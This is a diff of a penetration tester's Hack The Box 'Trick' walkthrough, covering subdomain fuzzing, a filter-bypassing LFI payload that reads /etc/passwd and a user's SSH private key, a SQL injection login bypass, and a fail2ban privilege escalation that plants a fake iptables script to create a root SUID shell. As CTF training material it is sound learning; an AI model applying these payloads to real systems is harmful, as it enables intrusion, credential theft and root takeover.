-<h2 id="step-5-subdomain-fuzzing-a-name-step-5-a">Step 5 — Subdomain Fuzzing <pre class="raw-markup-example"><code>&lt;a name="step-5"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+
+<p>SQL injection auth bypasses are one of the oldest and most reliable attacks. The pattern <code>' or 1=1-- -</code> is a classic. Real software downloaded from the internet (like this Payroll Management System) is frequently vulnerable because developers prioritize features over security. When you identify off-the-shelf software, also search for CVEs - this specific bypass is <strong>CVE-2022-28468</strong>.</p>
+<hr>
+<h2 id="step-5-subdomain-fuzzing">Step 5: Subdomain Fuzzing</h2>
 <h3 id="what-we-ran-5">What we ran</h3>
 <pre><code class="language-bash" data-language="bash">wfuzz -u http://trick.htb \
   -H "Host: preprod-FUZZ.trick.htb" \
   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
   --hh 5480 -t 50
 </code></pre>
-<h3 id="result">Result</h3>
+
 <pre><code>000000254:   200    178 L    631 W    9660 Ch    "marketing"
 </code></pre>
 <p>Found: <code>preprod-marketing.trick.htb</code></p>
-<h3 id="why-we-do-this-4">Why we do this</h3>
+
 <p>The zone transfer gave us <code>preprod-payroll</code>. The <code>preprod-</code> prefix is a naming pattern. Developers often follow consistent naming conventions for their environments (preprod, staging, dev, test). By fuzzing for other <code>preprod-*</code> subdomains, we discover more attack surface.</p>
-<p><code>wfuzz</code> works by sending HTTP requests, each time with a different value in the <code>Host:</code> header (where <code>FUZZ</code> gets replaced by each word in the list). The <code>--hh 5480</code> flag filters out responses with 5480 characters — that's the size of the default homepage, so we only see responses that are <em>different</em>.</p>
+<p><code>wfuzz</code> works by sending HTTP requests, each time with a different value in the <code>Host:</code> header (where <code>FUZZ</code> gets replaced by each word in the list). The <code>--hh 5480</code> flag filters out responses with 5480 characters - that's the size of the default homepage, so we only see responses that are <em>different</em>.</p>
 <h3 id="added-to-hosts">Added to hosts</h3>
 <pre><code class="language-bash" data-language="bash">echo "10.129.227.180 preprod-marketing.trick.htb" | sudo tee -a /etc/hosts
 </code></pre>
-<h3 id="hacker-mindset-5">Hacker mindset</h3>
-<p>Never assume the zone transfer gave you everything. DNS misconfigurations may only expose some records. Fuzzing for virtual hosts is an independent discovery technique that doesn't rely on DNS at all — it directly asks the web server. The combination of both techniques gives you maximum coverage.</p>
-<hr />
-<h2 id="step-6-lfi-discovery-and-exploitation-a-name-step-6-a">Step 6 — LFI Discovery &amp; Exploitation <pre class="raw-markup-example"><code>&lt;a name="step-6"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+
+<p>Never assume the zone transfer gave you everything. DNS misconfigurations may only expose some records. Fuzzing for virtual hosts is an independent discovery technique that doesn't rely on DNS at all - it directly asks the web server. The combination of both techniques gives you maximum coverage.</p>
+<hr>
+<h2 id="step-6-lfi-discovery-and-exploitation">Step 6: LFI Discovery &amp; Exploitation</h2>
 <h3 id="what-we-observed">What we observed</h3>
 <p>Browsing to <code>preprod-marketing.trick.htb</code>, we notice the URL structure:</p>
 <pre><code>http://preprod-marketing.trick.htb/index.php?page=services.html
@@ -148,20 +146,20 @@ Result: ../../etc/passwd        ← which IS a valid traversal
 <h3 id="testing-lfi">Testing LFI</h3>
 <pre><code class="language-bash" data-language="bash">curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd"
 </code></pre>
-<p>This returns the contents of <code>/etc/passwd</code> — LFI confirmed.</p>
-<h3 id="why-this-matters">Why this matters</h3>
+<p>This returns the contents of <code>/etc/passwd</code> - LFI confirmed.</p>
+
 <p>LFI lets you read any file on the server that the PHP process has permission to read. This includes:</p>
 <ul>
-<li><code>/etc/passwd</code> — list of users</li>
+<li><code>/etc/passwd</code> : list of users</li>
 <li>SSH private keys</li>
 <li>Config files with passwords</li>
 <li>Source code of other applications</li>
 <li>Log files (can lead to RCE via log poisoning)</li>
 </ul>
-<h3 id="hacker-mindset-6">Hacker mindset</h3>
-<p>Any time you see a <code>page=</code>, <code>file=</code>, <code>path=</code>, <code>include=</code>, or similar parameter in a URL, test for LFI immediately. The <code>str_replace</code> defense is a well-known bad practice — a blacklist approach to security almost always fails because attackers find creative ways around it. Whitelisting (only allowing specific known-good values) is the correct defense.</p>
-<hr />
-<h2 id="step-7-reading-michael-s-ssh-key-a-name-step-7-a">Step 7 — Reading michael's SSH Key <pre class="raw-markup-example"><code>&lt;a name="step-7"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+
+<p>Any time you see a <code>page=</code>, <code>file=</code>, <code>path=</code>, <code>include=</code>, or similar parameter in a URL, test for LFI immediately. The <code>str_replace</code> defense is a well-known bad practice - a blacklist approach to security almost always fails because attackers find creative ways around it. Whitelisting (only allowing specific known-good values) is the correct defense.</p>
+<hr>
+<h2 id="step-7-reading-michael-s-ssh-key">Step 7: Reading michael's SSH Key</h2>
 <h3 id="what-we-ran-6">What we ran</h3>
 <pre><code class="language-bash" data-language="bash">curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa"
 </code></pre>
@@ -169,37 +167,37 @@ Result: ../../etc/passwd        ← which IS a valid traversal
 <p>From the <code>/etc/passwd</code> file we read earlier, michael is the only non-root user with a login shell:</p>
 <pre><code>michael:x:1001:1001::/home/michael:/bin/bash
 </code></pre>
-<p>Also, the nginx config (found earlier via SQL injection file read) reveals that the marketing site runs PHP as michael via <code>php7.3-fpm-michael.sock</code>. This means the PHP process has michael's file permissions — including read access to michael's home directory.</p>
+<p>Also, the nginx config (found earlier via SQL injection file read) reveals that the marketing site runs PHP as michael via <code>php7.3-fpm-michael.sock</code>. This means the PHP process has michael's file permissions - including read access to michael's home directory.</p>
 <h3 id="why-ssh-keys">Why SSH keys?</h3>
 <p>SSH keys in <code>~/.ssh/id_rsa</code> are private keys used for passwordless SSH authentication. If the public key (<code>id_rsa.pub</code>) is in <code>authorized_keys</code> (which is the default setup), we can use the private key to log in as that user without knowing their password.</p>
 <h3 id="saving-and-using-the-key">Saving and using the key</h3>
 <pre><code class="language-bash" data-language="bash">curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa" &gt; /tmp/michael_id_rsa
 chmod 600 /tmp/michael_id_rsa
 </code></pre>
-<p>The <code>chmod 600</code> is critical — SSH refuses to use private key files that are readable by others (a security feature of the SSH client).</p>
-<h3 id="hacker-mindset-7">Hacker mindset</h3>
-<p>Once you have LFI as a specific user, immediately look for SSH keys. <code>~/.ssh/id_rsa</code> is the default location and exists on a huge number of Linux systems. This is often faster and more reliable than trying to achieve code execution through log poisoning or mail injection. Always take the path of least resistance.</p>
-<hr />
-<h2 id="step-8-ssh-access-and-user-flag-a-name-step-8-a">Step 8 — SSH Access &amp; User Flag <pre class="raw-markup-example"><code>&lt;a name="step-8"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+<p>The <code>chmod 600</code> is critical - SSH refuses to use private key files that are readable by others (a security feature of the SSH client).</p>
+
+<p>Once you have LFI as a specific user, immediately look for SSH keys. <code>~/.ssh/id_rsa</code> is the default location and exists on many of Linux systems. This is often faster and more reliable than trying to achieve code execution through log poisoning or mail injection. Always take the path of least resistance.</p>
+<hr>
+<h2 id="step-8-ssh-access-and-user-flag">Step 8: SSH Access &amp; User Flag</h2>
 <h3 id="what-we-ran-7">What we ran</h3>
 <pre><code class="language-bash" data-language="bash">ssh -i /tmp/michael_id_rsa michael@10.129.227.180
 </code></pre>
-<h3 id="result-2">Result</h3>
+
 <pre><code>michael@trick:~$ cat user.txt
 a20a41[redacted]af5aa46bd
 </code></pre>
-<h3 id="hacker-mindset-8">Hacker mindset</h3>
+
 <p>After getting a shell, the first things to check are always:</p>
 <ol>
-<li><strong>Who am I?</strong> — <code>id</code></li>
-<li><strong>What groups am I in?</strong> — <code>id</code> (check for unusual groups)</li>
-<li><strong>What can I run as root?</strong> — <code>sudo -l</code></li>
-<li><strong>What's in my home directory?</strong> — <code>ls -la ~</code></li>
-<li><strong>What other users exist?</strong> — <code>cat /etc/passwd</code></li>
+<li><strong>Who am I?</strong> : <code>id</code></li>
+<li><strong>What groups am I in?</strong> : <code>id</code> (check for unusual groups)</li>
+<li><strong>What can I run as root?</strong> : <code>sudo -l</code></li>
+<li><strong>What's in my home directory?</strong> : <code>ls -la ~</code></li>
+<li><strong>What other users exist?</strong> : <code>cat /etc/passwd</code></li>
 </ol>
-<p>Notice michael is in the <code>security</code> group — a non-standard group. This is a flag that something unusual has been configured. Always investigate non-standard groups.</p>
-<hr />
-<h2 id="step-9-privilege-escalation-via-fail2ban-a-name-step-9-a">Step 9 — Privilege Escalation via fail2ban <pre class="raw-markup-example"><code>&lt;a name="step-9"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+<p>Notice michael is in the <code>security</code> group - a non-standard group. This is a flag that something unusual has been configured. Always investigate non-standard groups.</p>
+<hr>
+<h2 id="step-9-privilege-escalation-via-fail2ban">Step 9: Privilege Escalation via fail2ban</h2>
 <h3 id="discovery">Discovery</h3>
 <pre><code class="language-bash" data-language="bash">sudo -l
 </code></pre>
@@ -218,9 +216,9 @@ a20a41[redacted]af5aa46bd
 <h3 id="understanding-fail2ban">Understanding fail2ban</h3>
 <p>fail2ban is a security tool that monitors log files for repeated failed login attempts and bans offending IPs using firewall rules (iptables). Its configuration has three parts:</p>
 <ul>
-<li><strong>Filters</strong> — regex patterns to detect failures in log files</li>
-<li><strong>Actions</strong> — what to do when a threshold is hit (e.g., add an iptables rule)</li>
-<li><strong>Jails</strong> — connect a filter to an action for a specific service</li>
+<li><strong>Filters</strong> : regex patterns to detect failures in log files</li>
+<li><strong>Actions</strong> : what to do when a threshold is hit (e.g., add an iptables rule)</li>
+<li><strong>Jails</strong> : connect a filter to an action for a specific service</li>
 </ul>
 <p>The default action for SSH banning is <code>iptables-multiport</code>, which calls <code>iptables</code> (defined in <code>iptables-common.conf</code>) to block the IP.</p>
 <h3 id="the-vulnerability">The vulnerability</h3>
@@ -228,12 +226,12 @@ a20a41[redacted]af5aa46bd
 <pre><code class="language-ini" data-language="ini">[INCLUDES]
 after = iptables-common.local
 </code></pre>
-<p>The <code>after =</code> directive means fail2ban will load <code>iptables-common.local</code> after the main config, allowing values to be overridden. Crucially, <strong>this file doesn't exist yet</strong> — and we can create new files in <code>action.d</code> (we just can't overwrite existing ones).</p>
+<p>The <code>after =</code> directive means fail2ban will load <code>iptables-common.local</code> after the main config, allowing values to be overridden. Crucially, <strong>this file doesn't exist yet</strong> - and we can create new files in <code>action.d</code> (we just can't overwrite existing ones).</p>
 <p>The <code>iptables</code> variable in <code>iptables-common.conf</code> defines the actual command called when banning:</p>
 <pre><code class="language-ini" data-language="ini">iptables = iptables &lt;lockingopt&gt;
 </code></pre>
 <p>We can override this in our new <code>iptables-common.local</code> to point to our own malicious script.</p>
-<h3 id="the-exploit-step-by-step">The exploit — step by step</h3>
+<h3 id="the-exploit-step-by-step">The exploit: step by step</h3>
 <p><strong>1. Create the malicious "iptables" script:</strong></p>
 <pre><code class="language-bash" data-language="bash">echo -e '#!/bin/bash\ncp /bin/bash /tmp/bash; chmod 4777 /tmp/bash' &gt; /tmp/iptables
 chmod +x /tmp/iptables
@@ -250,14 +248,14 @@ chmod +x /tmp/iptables
 <p><strong>4. Trigger a ban by making 5+ failed SSH attempts:</strong></p>
 <pre><code class="language-bash" data-language="bash">for i in {1..7}; do sshpass -p REDACTED ssh -o StrictHostKeyChecking=no wronguser@10.129.227.180 2&gt;/dev/null; done
 </code></pre>
-<p>After 5 failures (the <code>maxretry</code> threshold), fail2ban fires the <code>actionban</code> command — which calls our fake iptables script — which runs as root — which creates <code>/tmp/bash</code> with SUID.</p>
+<p>After 5 failures (the <code>maxretry</code> threshold), fail2ban fires the <code>actionban</code> command - which calls our fake iptables script - which runs as root - which creates <code>/tmp/bash</code> with SUID.</p>
 <p><strong>5. Exploit the SUID bash:</strong></p>
 <pre><code class="language-bash" data-language="bash">/tmp/bash -p
 </code></pre>
 <p>The <code>-p</code> flag tells bash to preserve the effective UID (euid=root) instead of dropping it. Without <code>-p</code>, bash would drop the SUID privilege as a security measure.</p>
-<h3 id="why-this-works-2">Why this works</h3>
+
 <p>fail2ban runs as root. When it executes our fake iptables binary, that process inherits root privileges. The <code>cp /bin/bash /tmp/bash; chmod 4777</code> command creates a root-owned SUID binary we can use to get a root shell at any time.</p>
-<h3 id="hacker-mindset-9">Hacker mindset</h3>
+
 <p>The privilege escalation chain here requires connecting several dots:</p>
 <ol>
 <li><code>sudo -l</code> → can restart fail2ban (most people would look at GTFOBins and stop here)</li>
@@ -266,14 +264,14 @@ chmod +x /tmp/iptables
 <li>Understanding fail2ban's include/override mechanism → <code>iptables-common.local</code> doesn't exist, we can create it</li>
 <li>Knowing that fail2ban runs as root → our malicious command runs as root</li>
 </ol>
-<p>This is the hacker mindset: <strong>don't look for a single magic vulnerability, look for a chain of small misconfigurations that combine into full compromise</strong>.</p>
-<hr />
-<h2 id="root-flag-a-name-root-flag-a">Root Flag <pre class="raw-markup-example"><code>&lt;a name="root-flag"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+<p>The lesson is to look for a chain of small misconfigurations rather than one decisive vulnerability.</p>
+<hr>
+<h2 id="root-flag">Root Flag</h2>
 <pre><code class="language-bash" data-language="bash">bash-5.0# cat /root/root.txt
 7a15f29[redacted]c9b01c2d
 </code></pre>
-<hr />
-<h2 id="lessons-learned-a-name-lessons-a">Lessons Learned <pre class="raw-markup-example"><code>&lt;a name="lessons"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+<hr>
+<h2 id="lessons-learned">Lessons Learned</h2>
 <h3 id="vulnerabilities-exploited">Vulnerabilities exploited</h3>
 <table aria-label="Vulnerabilities exploited data table">
 <thead>
@@ -319,27 +317,26 @@ chmod +x /tmp/iptables
 <td>Ability to reload malicious config</td>
 </tr>
 </tbody></table>
-<h3 id="key-takeaways-for-defenders">Key takeaways for defenders</h3>
+<h3 id="review-notes-for-defenders">Review notes for defenders</h3>
 <ol>
 <li><strong>Restrict DNS zone transfers</strong> to specific trusted IPs only</li>
-<li><strong>Use prepared statements</strong> for all SQL queries — never concatenate user input</li>
-<li><strong>Never use blacklist filtering</strong> (str_replace, str_ireplace) for security — use a whitelist</li>
+<li><strong>Use prepared statements</strong> for all SQL queries - never concatenate user input</li>
+<li><strong>Never use blacklist filtering</strong> (str_replace, str_ireplace) for security - use a whitelist</li>
 <li><strong>Restrict SSH key permissions</strong> and don't leave private keys world-readable</li>
-<li><strong>Audit group permissions</strong> — non-standard groups with write access to security tool configs are dangerous</li>
+<li><strong>Audit group permissions</strong> : non-standard groups with write access to security tool configs are dangerous</li>
 <li><strong>NOPASSWD sudo entries</strong> dramatically reduce the effort needed to escalate from a compromised account to root</li>
 </ol>
-<h3 id="key-takeaways-for-attackers">Key takeaways for attackers</h3>
+<h3 id="review-notes-for-attackers">Review notes for attackers</h3>
 <ol>
-<li>Check <strong>every unusual open port</strong> — DNS and SMTP both contributed here</li>
+<li>Check <strong>every unusual open port</strong> : DNS and SMTP both contributed here</li>
 <li>Always <strong>fuzz for virtual hosts</strong> when you see a web server</li>
 <li><strong>LFI → SSH key</strong> is often faster than LFI → RCE</li>
-<li>After getting a shell: <strong><code>sudo -l</code> and <code>id</code> immediately</strong> — always</li>
+<li>After getting a shell: <strong><code>sudo -l</code> and <code>id</code> immediately</strong> : always</li>
 <li>Non-standard groups in <code>id</code> output are almost always relevant to privilege escalation</li>
 <li>Understanding <em>how</em> a tool works (fail2ban's include mechanism) is more powerful than just knowing it exists</li>
-</ol>
-12:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$17"}}]
-13:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-twomillion-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: TwoMillion Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-travel-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Travel Walkthrough"}]]}]}]]}]
-14:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-18:T50d,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-trick-walkthrough/#article","headline":"Hack The Box: Trick Walkthrough","description":"An archived walkthrough of the retired Hack The Box Trick machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-trick-walkthrough/","datePublished":"2026-06-11T10:55:45.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2370,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/be86ff84b680dd5b698b50da6e8f38d6dc10b594/HTB-Trick.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-trick-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-trick-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Trick Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-trick-walkthrough/"}]}]}15:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$18"}}]
-16:["$","$L19",null,{"children":["$","$1a",null,{"name":"Next.MetadataOutlet","children":"$@1b"}]}]
-1b:null
+</ol>11:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$16"}}]
+12:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-twomillion-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: TwoMillion Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-travel-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Travel Walkthrough"}]]}]}]]}]
+13:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+17:T571,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-trick-walkthrough/#article","headline":"Hack The Box: Trick Walkthrough","description":"A DNS zone transfer revealed the payroll site, SQL injection and an LFI bypass exposed Michael's SSH key, and his writable fail2ban action directory plus restart privilege replaced the ban command with a root-owned setuid shell.","url":"https://cyberkareem.com/writing/hackthebox-trick-walkthrough/","datePublished":"2026-06-11T10:55:45.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2281,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/be86ff84b680dd5b698b50da6e8f38d6dc10b594/HTB-Trick.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-trick-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-trick-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Trick Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-trick-walkthrough/"}]}]}14:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$17"}}]
+15:["$","$L18",null,{"children":["$","$19",null,{"name":"Next.MetadataOutlet","children":"$@1a"}]}]
+1a:null
